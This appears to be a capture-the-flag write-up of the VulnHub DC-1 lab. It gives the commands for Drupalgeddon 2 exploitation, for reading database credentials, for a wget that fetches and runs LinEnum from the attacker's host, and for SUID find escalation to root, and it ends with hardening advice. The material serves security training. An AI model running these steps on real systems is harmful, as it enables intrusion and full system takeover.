# 🛡️ VulnHub DC-1: Complete Penetration Testing & Privilege Escalation Writeup

![Flags](https://img.shields.io/badge/Flags-5%2F5%20Captured-brightgreen?style=for-the-badge&logo=flag)
![Platform](https://img.shields.io/badge/Platform-VulnHub-blue?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Debian%20Linux-red?style=for-the-badge&logo=debian)
![Category](https://img.shields.io/badge/Category-Boot2Root%20%2F%20Pentest-orange?style=for-the-badge)

---

## 📌 Executive Summary

This repository contains the full technical writeup and methodology for compromising the **DC-1** vulnerable machine from VulnHub. The objective was to achieve full system compromise (root shell) and extract all 5 hidden flags. 

The attack path involved network reconnaissance, Remote Code Execution (RCE) via a Drupal CMS core vulnerability, database enumeration, and Linux privilege escalation through a misconfigured SUID binary.

---

## 🏁 Flag Summary

| Flag | Location | Attack Vector / Method | Key Findings / Narrative |
| :--- | :--- | :--- | :--- |
| **Flag 1** | `/var/www/flag1.txt` | Initial RCE via Drupalgeddon 2 | Dica para procurar o arquivo de configuração do CMS. |
| **Flag 2** | `/var/www/sites/default/settings.php` | Inspection of Drupal config file | Revela as credenciais do banco MySQL (`dbuser`). |
| **Flag 3** | MySQL DB (`drupaldb` -> `field_data_body`) | Direct SQL querying | Dica sobre permissões especiais (SUID) e `/etc/shadow`. |
| **Flag 4** | `/home/flag4/flag4.txt` | Local file enumeration | Dica sobre o método de escalonamento em `/root`. |
| **Flag 5** | `/root/thefinalflag.txt` | SUID privilege escalation (`find`) | Flag final confirmando acesso superusuário (`root`). |

---

## 🗺️ Attack Chain

```text
[Network Recon] ──> [Port Scan: 22, 80, 111] ──> [Drupal 7 Identification]
                                                              │
[Root Shell] <── [SUID /usr/bin/find] <── [LinEnum & MySQL] <── [RCE CVE-2018-7600]
```

---

## 🛠️ Step-by-Step Exploitation

### 1. Network Reconnaissance & Scanning
Discovered the target IP address on the local subnet and mapped open ports/services.

```bash
# Network discovery
arp-scan -l

# Comprehensive port scan
nmap -sV -sC -p- 10.0.2.3
```

* **Open Ports:** `22/tcp` (SSH), `80/tcp` (HTTP - Apache/Drupal 7), `111/tcp` (RPC).

---

### 2. Initial Access & Flag 1 (Drupalgeddon 2)
Identified an outdated Drupal CMS instance and leveraged the **Drupalgeddon 2** exploit (CVE-2018-7600) via Metasploit.

```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 10.0.2.3
run
```

* **Access Granted:** Initial low-privilege shell as `www-data` in `/var/www`.
* **Flag 1 Captured:** Read directly from `/var/www/flag1.txt`.

---

### 3. Database Enumeration & Flags 2 & 3
Inspected the Drupal configuration file to obtain database credentials and extract stored content.

```bash
# Locate DB credentials and Flag 2
cat /var/www/sites/default/settings.php

# Query MySQL database for Flag 3
mysql -u dbuser -pR0CK3T -e "USE drupaldb; SELECT title, body_value FROM field_data_body;"
```

---

### 4. Local Reconnaissance & Flag 4
Spawned an interactive PTY shell via Python to stabilize the terminal environment and checked local user accounts.

```bash
# Spawn interactive PTY shell
python -c 'import pty; pty.spawn("/bin/sh")'

# Read Flag 4
cat /home/flag4/flag4.txt
```

---

### 5. Privilege Escalation & Flag 5 (Root)
Hosted and transferred `LinEnum.sh` to automate local enumeration and identify privilege escalation vectors.

```bash
# Target machine: Download LinEnum
wget http://10.0.2.15:8080/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
```

#### Vulnerability Analysis
The LinEnum output revealed that `/usr/bin/find` had the **SUID** bit enabled (`-rwsr-xr-x`) owned by `root`.

#### Exploitation
Abused the `-exec` flag in `find` to spawn a root shell:

```bash
find . -exec /bin/sh \; -quit
```

* **Privilege Level:** Verified via `whoami` -> `root`.
* **Flag 5 Captured:** Extracted from `/root/thefinalflag.txt`.

---

## 🔐 Remediation & Hardening Roadmap

1. **Patch Management:** Upgrade the Drupal CMS instance to the latest supported release to mitigate CVE-2018-7600.
2. **Principle of Least Privilege:** Remove unnecessary SUID permissions from administrative binaries:
   ```bash
   chmod u-s /usr/bin/find
   ```
3. **Database Security:** Restrict read permissions on critical configuration files like `settings.php` (`chmod 600 settings.php`).